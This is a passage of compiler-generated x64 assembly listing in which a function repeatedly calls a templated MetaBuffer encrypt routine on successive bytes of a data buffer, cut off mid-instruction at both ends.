  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	b8 01 00 00 00	 mov	 eax, 1
  001ad	48 6b c0 09	 imul	 rax, rax, 9
  001b1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001b8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001c3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::encrypt
  001c8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001cf	88 41 0a	 mov	 BYTE PTR [rcx+10], al
  001d2	b8 01 00 00 00	 mov	 eax, 1
  001d7	48 6b c0 0a	 imul	 rax, rax, 10
  001db	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001e2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001ed	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::encrypt
  001f2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001f9	88 41 0b	 mov	 BYTE PTR [rcx+11], al
  001fc	b8 01 00 00 00	 mov	 eax, 1
  00201	48 6b c0 0b	 imul	 rax, rax, 11
  00205	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0020c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00210	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00217	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::encrypt
  0021c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00223	88 41 0c	 mov	 BYTE PTR [rcx+12], al
  00226	b8 01 00 00 00	 mov	 eax, 1
  0022b	48 6b c0 0c	 imul	 rax, rax, 12
  0022f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00236	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0023a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00241	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::encrypt
  00246	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0024d	88 41 0d	 mov	 BYTE PTR [rcx+13], al
  00250	b8 01 00 00 00	 mov	 eax, 1
  00255	48 6b c0 0d	 imul	 rax, rax, 13
  00259	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00260	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00264	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0026b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::encrypt
  00270	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00277	88 41 0e	 mov	 BYTE PTR [rcx+14], al
  0027a	b8 01 00 00 00	 mov	 eax, 1
  0027f	48 6b c0 0e	 imul	 rax, rax, 14
  00283	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0028a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0028e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00295	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::encrypt
  0029a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002a1	88 41 0f	 mov	 BYTE PTR [rcx+15], al
  002a4	b8 01 00 00 00	 mov	 eax, 1
  002a9	48 6b c0 0f	 imul	 rax, rax, 15
  002ad	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002b4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002b8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002bf	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::encrypt
  002c4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002cb	88 41 10	 mov	 BYTE PTR [rcx+16], al
  002ce	b8 01 00 00 00	 mov	 eax, 1
  002d3	48 6b c0 10	 imul	 rax, rax, 16
  002d7	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002de	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002e2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002e9	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::encrypt
  002ee	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002f5	88 41 11	 mov	 BYTE PTR [rcx+17], al
  002f8	b8 01 00 00 00	 mov	 eax, 1
  002fd	48 6b c0 11	 imul	 rax, rax, 17
  00301	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00308	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0030c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00313	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::encrypt
  00318	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0031f	88 41 12	 mov	 BYTE PTR [rcx+18], al
  00322	b8 01 00 00 00	 mov	 eax, 1
  00327	48 6b c0 12	 imul	 rax, rax, 18
  0032b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00332	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00336	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0033d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::encrypt
  00342	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00349	88 41 13	 mov	 BYTE PTR [rcx+19], al
  0034c	b8 01 00 00 00	 mov	 eax, 1
  00351	48 6b c0 13	 imul	 rax, rax, 19
  00355	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0035c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00360	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00367	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::encrypt
  0036c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00373	88 41 14	 mov	 BYTE PTR [rcx+20], al
  00376	b8 01 00 00 00	 mov	 eax, 1
  0037b	48 6b c0 14	 imul	 rax, rax, 20
  0037f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00386	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0038a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00391	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::encrypt
  00396	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0039d	88 41 15	 mov	 BYTE PTR [rcx+21], al
  003a0	b8 01 00 00 00	 mov	 eax, 1
  003a5	48 6b c0 15	 imul	 rax, rax, 21
  003a9	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  003b0	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  003b4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003bb	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::encrypt
  003c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003c7	88 41 16	 mov	 BYTE PTR [rcx+22], al
  003ca	b8 01 00 00 00	 mov	 eax, 1
  003cf	48 6b c0 16	 imul	 rax, rax, 22
  003d3	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  003da	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  003de	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003e5	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::encrypt
  003ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003f1	88 41 17	 mov	 BYTE PTR [rcx+23], al
  003f4	b8 01 00 00 00	 mov	 eax, 1
  003f9	48 6b c0 17	 imul	 rax, rax, 23
  003fd	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00404	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00408	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0040f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::encrypt
  00414	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0041b	88 41 18	 mov	 BYTE PTR [rcx+24], al
  0041e	b8 01 00 00 00	 mov	 eax, 1
  00423	48 6b c0 18	 imul	 rax, rax, 24
  00427	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0042e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00432	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00439	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::encrypt
  0043e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00445	88 41 19	 mov	 BYTE PTR [rcx+25], al
  00448	b8 01 00 00 00	 mov	 eax, 1
  0044d	48 6b c0 19	 imul	 rax, rax, 25
  00451	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00458	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0045c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00463	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::encrypt
  00468	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0046f	88 41 1a	 mov	 BYTE PTR [rcx+26], al
  00472	b8 01 00 00 00	 mov	 eax, 1
  00477	48 6b c0 1a	 imul	 rax, rax, 26
  0047b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00482	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00486	48 8b 8d f0 00
